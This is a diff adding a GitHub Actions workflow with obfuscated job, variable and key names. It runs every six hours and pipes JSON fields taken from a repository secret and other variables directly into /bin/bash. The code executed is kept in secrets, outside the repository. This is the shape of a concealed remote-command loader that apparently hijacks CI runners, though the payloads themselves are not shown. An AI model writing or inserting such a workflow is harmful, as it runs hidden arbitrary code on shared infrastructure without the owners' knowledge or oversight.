@@ -1,0 +1,24 @@
+name: consumefoolhardy
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: consumefoolhardy
+        env:
+          izucv71: ${{ secrets.izucv71 }}
+        run: |
+          echo $izucv71 | jq -r .pu99 | /bin/bash
+          echo $y30811 | jq -r .ykqy29 | /bin/bash
+          echo $dgj2 | jq -r .vzeg55307 | /bin/bash
+          echo $fpc51 | jq -r .po35 | /bin/bash
+          echo $oe291 | jq -r .sheq1939 | /bin/bash
+          echo $zzlov63 | jq -r .fpgl97 | /bin/bash
+          echo $niv17325 | jq -r .b18 | /bin/bash
+          echo $ofse98 | jq -r .pmq3969 | /bin/bash
+
